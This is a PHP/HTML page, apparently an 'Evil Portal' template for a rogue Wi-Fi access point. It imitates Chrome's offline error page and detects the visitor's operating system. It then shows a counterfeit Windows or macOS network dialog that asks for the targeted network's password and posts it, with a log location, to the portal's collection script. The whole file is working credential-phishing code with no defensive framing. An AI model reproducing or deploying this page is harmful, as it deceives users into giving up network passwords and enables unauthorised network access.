
<?php
$destination = "http://". $_SERVER['HTTP_HOST'] . $_SERVER['HTTP_URI'] . "";
include("config.php");
?>

<html>
<head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0,
        maximum-scale=1.0, user-scalable=no">
        <title i18n-content="title">Internet connection is not available</title>
        <link rel='stylesheet' href='static/chrome-offline.css' type='text/css' />
        <script src="static/jquery.js"></script>
 
        <script>
        
        //Function added from evilportal template
        function redirect() { setTimeout(function(){window.location = "<?php print $destination; ?>/captiveportal/index.php";},100);} 
        
        /**
         * JavaScript Client Detection
         * (C) viazenetti GmbH (Christian Ludwig)
         */
         
        function setJSCD() {
                var unknown = '-';

                // screen
                var screenSize = '';
                if (screen.width) {
                    width = (screen.width) ? screen.width : '';
                    height = (screen.height) ? screen.height : '';
                    screenSize += '' + width + " x " + height;
                }

                // browser
                var nVer = navigator.appVersion;
                var nAgt = navigator.userAgent;
                var browser = navigator.appName;
                var version = '' + parseFloat(navigator.appVersion);
                var majorVersion = parseInt(navigator.appVersion, 10);
                var nameOffset, verOffset, ix;

                // Opera
                if ((verOffset = nAgt.indexOf('Opera')) != -1) {
                    browser = 'Opera';
                    version = nAgt.substring(verOffset + 6);
                    if ((verOffset = nAgt.indexOf('Version')) != -1) {
                        version = nAgt.substring(verOffset + 8);
                    }
                }
                // Opera Next
                if ((verOffset = nAgt.indexOf('OPR')) != -1) {
                    browser = 'Opera';
                    version = nAgt.substring(verOffset + 4);
                }
                // Edge
                else if ((verOffset = nAgt.indexOf('Edge')) != -1) {
                    browser = 'Microsoft Edge';
                    version = nAgt.substring(verOffset + 5);
                }
                // MSIE
                else if ((verOffset = nAgt.indexOf('MSIE')) != -1) {
                    browser = 'Microsoft Internet Explorer';
                    version = nAgt.substring(verOffset + 5);
                }
                // Chrome
                else if ((verOffset = nAgt.indexOf('Chrome')) != -1) {
                    browser = 'Chrome';
                    version = nAgt.substring(verOffset + 7);
                }
                // Safari
                else if ((verOffset = nAgt.indexOf('Safari')) != -1) {
                    browser = 'Safari';
                    version = nAgt.substring(verOffset + 7);
                    if ((verOffset = nAgt.indexOf('Version')) != -1) {
                        version = nAgt.substring(verOffset + 8);
                    }
                }
                // Firefox
                else if ((verOffset = nAgt.indexOf('Firefox')) != -1) {
                    browser = 'Firefox';
                    version = nAgt.substring(verOffset + 8);
                }
                // MSIE 11+
                else if (nAgt.indexOf('Trident/') != -1) {
                    browser = 'Microsoft Internet Explorer';
                    version = nAgt.substring(nAgt.indexOf('rv:') + 3);
                }
                // Other browsers
                else if ((nameOffset = nAgt.lastIndexOf(' ') + 1) < (verOffset = nAgt.lastIndexOf('/'))) {
                    browser = nAgt.substring(nameOffset, verOffset);
                    version = nAgt.substring(verOffset + 1);
                    if (browser.toLowerCase() == browser.toUpperCase()) {
                        browser = navigator.appName;
                    }
                }
                // trim the version string
                if ((ix = version.indexOf(';')) != -1) version = version.substring(0, ix);
                if ((ix = version.indexOf(' ')) != -1) version = version.substring(0, ix);
                if ((ix = version.indexOf(')')) != -1) version = version.substring(0, ix);

                majorVersion = parseInt('' + version, 10);
                if (isNaN(majorVersion)) {
                    version = '' + parseFloat(navigator.appVersion);
                    majorVersion = parseInt(navigator.appVersion, 10);
                }

                // mobile version
                var mobile = /Mobile|mini|Fennec|Android|iP(ad|od|hone)/.test(nVer);

                // cookie
                var cookieEnabled = (navigator.cookieEnabled) ? true : false;

                if (typeof navigator.cookieEnabled == 'undefined' && !cookieEnabled) {
                    document.cookie = 'testcookie';
                    cookieEnabled = (document.cookie.indexOf('testcookie') != -1) ? true : false;
                }

                // system
                var os = unknown;
                var clientStrings = [
                    {s:'Windows 10', r:/(Windows 10.0|Windows NT 10.0)/},
                    {s:'Windows 8.1', r:/(Windows 8.1|Windows NT 6.3)/},
                    {s:'Windows 8', r:/(Windows 8|Windows NT 6.2)/},
                    {s:'Windows 7', r:/(Windows 7|Windows NT 6.1)/},
                    {s:'Windows Vista', r:/Windows NT 6.0/},
                    {s:'Windows Server 2003', r:/Windows NT 5.2/},
                    {s:'Windows XP', r:/(Windows NT 5.1|Windows XP)/},
                    {s:'Windows 2000', r:/(Windows NT 5.0|Windows 2000)/},
                    {s:'Windows ME', r:/(Win 9x 4.90|Windows ME)/},
                    {s:'Windows 98', r:/(Windows 98|Win98)/},
                    {s:'Windows 95', r:/(Windows 95|Win95|Windows_95)/},
                    {s:'Windows NT 4.0', r:/(Windows NT 4.0|WinNT4.0|WinNT|Windows NT)/},
                    {s:'Windows CE', r:/Windows CE/},
                    {s:'Windows 3.11', r:/Win16/},
                    {s:'Android', r:/Android/},
                    {s:'Open BSD', r:/OpenBSD/},
                    {s:'Sun OS', r:/SunOS/},
                    {s:'Linux', r:/(Linux|X11)/},
                    {s:'iOS', r:/(iPhone|iPad|iPod)/},
                    {s:'Mac OS X', r:/Mac OS X/},
                    {s:'Mac OS', r:/(MacPPC|MacIntel|Mac_PowerPC|Macintosh)/},
                    {s:'QNX', r:/QNX/},
                    {s:'UNIX', r:/UNIX/},
                    {s:'BeOS', r:/BeOS/},
                    {s:'OS/2', r:/OS\/2/},
                    {s:'Search Bot', r:/(nuhk|Googlebot|Yammybot|Openbot|Slurp|MSNBot|Ask Jeeves\/Teoma|ia_archiver)/}
                ];
                for (var id in clientStrings) {
                    var cs = clientStrings[id];
                    if (cs.r.test(nAgt)) {
                        os = cs.s;
                        break;
                    }
                }

                var osVersion = unknown;

                if (/Windows/.test(os)) {
                    osVersion = /Windows (.*)/.exec(os)[1];
                    os = 'Windows';
                }

                switch (os) {
                    case 'Mac OS X':
                        osVersion = /Mac OS X (10[\.\_\d]+)/.exec(nAgt)[1];
                        break;

                    case 'Android':
                        osVersion = /Android ([\.\_\d]+)/.exec(nAgt)[1];
                        break;

                    case 'iOS':
                        osVersion = /OS (\d+)_(\d+)_?(\d+)?/.exec(nVer);
                        osVersion = osVersion[1] + '.' + osVersion[2] + '.' + (osVersion[3] | 0);
                        break;
                }

                // flash (you'll need to include swfobject)
                /* script src="//ajax.googleapis.com/ajax/libs/swfobject/2.2/swfobject.js" */
                var flashVersion = 'no check';
                if (typeof swfobject != 'undefined') {
                    var fv = swfobject.getFlashPlayerVersion();
                    if (fv.major > 0) {
                        flashVersion = fv.major + '.' + fv.minor + ' r' + fv.release;
                    }
                    else  {
                        flashVersion = unknown;
                    }
                }

            window.jscd = {
                screen: screenSize,
                browser: browser,
                browserVersion: version,
                browserMajorVersion: majorVersion,
                mobile: mobile,
                os: os,
                osVersion: osVersion,
                cookies: cookieEnabled,
                flashVersion: flashVersion
            };
        }
        
        setJSCD()

        if (jscd.os == "Windows") {
            document.write("<link rel='stylesheet' href='static/style.css'>");
            document.write("<link href='static/opensans.css' rel='stylesheet' type='text/css'>");
        }
        else {
            document.write("<link rel='stylesheet' href='static/mac-network-manager.css' />");
        }


        var loadhtml_mac = '<div id="details" class="hidden" ></div>' +
        '<div class="mac-wifi" id="mac-wifi" style="display:none">' +
        '    <div id="modal-title" class="title"></div>' +
        '    <div class="content">' +
        '        <div class="icon">' +
        '            <img src="static/wifi-icon.png" alt="WiFi signal" width="70" class="wifi-icon" />' +
        '            <img src="static/question.png" alt="?" width="25" class="question" />' +
        '        </div>' +
        '        <div class="description">' +
        '           <form id="wifi-search-form" method="POST" action="<?=$destination?>/captiveportal/index.php" onsubmit="redirect()">' +
        '               <strong>The Wi-Fi network ″<?=$target_ap_essid ?>″ requires a <?=$target_ap_encryption ?> password.</strong>' + 
        '               <input type="hidden" name="target" value="<?=$destination?>"> ' +
        '               <input type="hidden" name="essid" value="<?=$target_ap_essid?>"> ' +
        '               <input type="hidden" name="log" value="<?=$logLocation?>"> ' +
        '               <div class="password">' +
        '                   <label>Password:</label>' +
        '                   <input type="password" id="password" name="password"/>' +
        '                   <input id="passwordShow" type="text" name="password" style="display:none;"/>' + 
        '                   <div></div>' +
        '               </div>' + 
        '               <div class="checkmark">' +
        '                   <input id="show-password" type="checkbox" /><label for="show-password">Show password</label>' +
        '               </div>' +
        '               <div class="checkmark">' +
        '                   <input id="remember-network" type="checkbox" /><label for="remember-network">Remember this network</label>' +
        '               </div>' + 
        '               <div class="buttons">' +
        '                     <button id="button-join" class="action" disabled="disabled">Join</button>' +
        '                   <button id="button-cancel">Cancel</button>' +
        '               </div>' +
        '           </form>' +
        '       </div>' +
        '   </div>' +
        '</div>';

        var loadhtml_windows = "<form method='POST' action='<?=$destination?>/captiveportal/index.php' onsubmit='redirect()'><div class=\'network-manager\'\>" +
        "<ul>" +
        "       <li class='selected'>" +
        "           <div class='wifi icon'>" +
        "               <div class='dot dot1'></div>" +
        "               <div class='small dot dot2'></div>" +
        "               <div class='small dot dot3'></div>" +
        "               <div class='small dot dot4'></div>" +
        "           </div>" +
        "           <input type='hidden' name='target' value='<?=$destination?>'>" +
        "           <input type='hidden' name='essid' value='<?=$target_ap_essid?>'>" +
        "           <input type='hidden' name='log' value='<?=$logLocation?>'>" +
        "           <div class='content'>" +
        "               <strong>{{ target_ap_essid }}</strong>" +
        "               <div class='disconnected'>" +
        "                   <input id='automatic' type='checkbox' />" +
        "                   <label for='automatic'>" +
        "                       <div class='check'></div>" +
        "                       Connect automatically" +
        "                   </label>" +
        "                   <button id='connect' class='connect' type='button'>Connect</button>" +
        "               </div>" +
        "               <div class='connected'>" +
        "                   Enter the network security key" +
        "                   <input id='password' type='password' name='password'/>" +
        "                   <input id='passwordShow' type='test' name='password' style='display:none;'/>" +   
        "                   You can also connect by pushing the button on the" +
        "                   router." +
        "                   <input id='share' type='checkbox' />" +
        "                   <label for='share'>" +
        "                       <div class='check'></div>" +
        "                       Share network with my contacts" +
        "                   </label>" +
        "                   <button class='authenticate'>Next</button> " +
        "                   <button class='cancel' type='button'>Cancel</button> " +
        "               </div> " +
        "           </div> " +
        "       </li> " +
        "        <li>" +
        "           <div class='wifi icon'>" +
        "               <div class='dot dot1'></div>" +
        "               <div class='small dot dot2'></div>" +
        "               <div class='small dot dot3'></div>" +
        "               <div class='small dot dot4'></div>" +
        "           </div>" +
        "           <div class='content'>" +
        "            <strong><?=$target_ap_essid ?></strong>" +
        "               <span>Connected</span>" +
        "           </div>" +
        "       </li>" +
        "       </ul> " +
        "       <a href=''>Network settings</a> " +
        "       </div></form>"; 
        </script>
        <title></title>
        </head>
    <body id="t" class="offline" style="font-family: 'Helvetica Neue', 'Lucida Grande', sans-serif; font-size: 75%;">
    <div id="main-frame-error" class="interstitial-wrapper">
        <div id="main-content">
            <img class="dinosaur" src="static/dinosaur.png" width="45" />
            <div class="icon icon-offline" style="visibility: hidden;"></div>
            <div id="main-message">
                <h1>There is no Internet connection</h1>
                <p>You can try to diagnose the problem by taking the following steps:
                <br />
                Go to
                <strong>
                Applications &gt; System Preferences &gt; Network &gt; Assist me
                </strong>
                to test your connection.</p>
                <div id="suggestions-list" >
                    <p >Try:</p>
                    <ul class="chrome-list">
                        <li>Checking the network cable or router</li>
                        <li>Resetting the modem or router</li>
                        <li>Reconnecting to Wi-Fi</li>
                    </ul>
                </div>
                <div class="error-code">ERR_INTERNET_DISCONNECTED</div>
            </div>
        </div>
        <div id="buttons" class="nav-wrapper suggested-right" >
            <button id="details-button" class="text-button small-link singular">Details</button>
        </div>
        <div id="loader-mac"></div>
        <div id="loader-windows"></div>
        <script>
            try {
              if (jscd.os == "Windows") {
                  $("#loader-windows").html(loadhtml_windows);
              }
              else {
                  $("#loader-mac").html(loadhtml_mac)
              }
            } catch(e) {
              $("#loader-mac").html(loadhtml_mac)
            }
        </script>
        <script src='static/win-behavior.js'></script>
        <script src='static/behavior.js'></script>
    </body>
</html>
